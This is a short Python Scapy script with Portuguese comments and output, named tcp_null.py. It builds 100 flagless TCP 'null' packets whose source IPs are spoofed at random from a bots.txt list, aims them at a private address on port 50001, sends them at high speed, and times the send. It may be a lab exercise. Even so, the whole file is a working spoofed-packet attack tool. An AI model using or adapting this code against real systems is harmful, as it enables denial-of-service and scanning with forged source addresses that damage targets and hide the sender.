from scapy.all import *
import random
import time
import ipaddress

TARGET_IP = "192.168.100.2"
TARGET_PORT = 50001
BOTFILE = "bots.txt"

def load_bots(filename):
    bot_ips = []
    with open(filename, "r") as f:
        for line in f:
            ip = line.strip()
            if ip:
                ipaddress.ip_address(ip)
                bot_ips.append(ip)
    return bot_ips

def run_tcp_null_attack():
    bot_ips = load_bots(BOTFILE)
    numero_de_pacotes_enviados = 0
    lista_de_pacotes = []

    while True:
        source_ip = random.choice(bot_ips)
        ip_layer = IP(src=source_ip, dst=TARGET_IP)
        eth_layer = Ether()
        seq_num = random.randint(0, 4294967295)
        tcp_layer = TCP(sport=RandShort(), dport=TARGET_PORT, flags='', seq=seq_num, window=8192)

        packet = eth_layer / ip_layer / tcp_layer  # Sem payload!

        lista_de_pacotes.append(packet)
        numero_de_pacotes_enviados += 1

        if numero_de_pacotes_enviados == 100:
            break

    start_time = time.perf_counter()
    sendpfast(lista_de_pacotes, iface="enp0s3", file_cache=True)
    end_time = time.perf_counter()
    duration = end_time - start_time

    print(f"\nEnvio concluído.")
    print(f"Tempo total para enviar os pacotes: {duration:.4f} segundos")

if __name__ == "__main__":
    run_tcp_null_attack()

# sudo PYTHONPATH=$HOME/scapy python3 tcp_null.py